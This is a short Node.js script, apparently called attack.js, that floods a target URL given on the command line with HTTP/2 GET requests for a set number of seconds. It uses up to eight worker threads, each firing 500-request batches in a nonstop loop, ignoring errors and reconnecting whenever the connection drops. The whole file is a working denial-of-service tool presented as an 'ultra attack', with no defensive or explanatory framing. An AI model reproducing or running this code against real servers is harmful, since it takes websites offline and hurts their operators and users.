const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.min(8, cpus().length);

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3], 10);

    console.log(`Launching ultra attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function flood(client) {
        const send = () => {
            if (Date.now() > end || client.closed || client.destroyed) return;

            for (let i = 0; i < 500; i++) {
                const req = client.request({ ':path': '/', ':method': 'GET' });
                req.on('error', () => {});
                req.end();
            }

            setImmediate(send); // burn CPU nonstop
        };
        send();
    }

    function start() {
        const client = http2.connect(target);
        client.on('error', () => {});
        client.on('connect', () => flood(client));
        client.on('close', () => setTimeout(start, 100));
    }

    start();
}
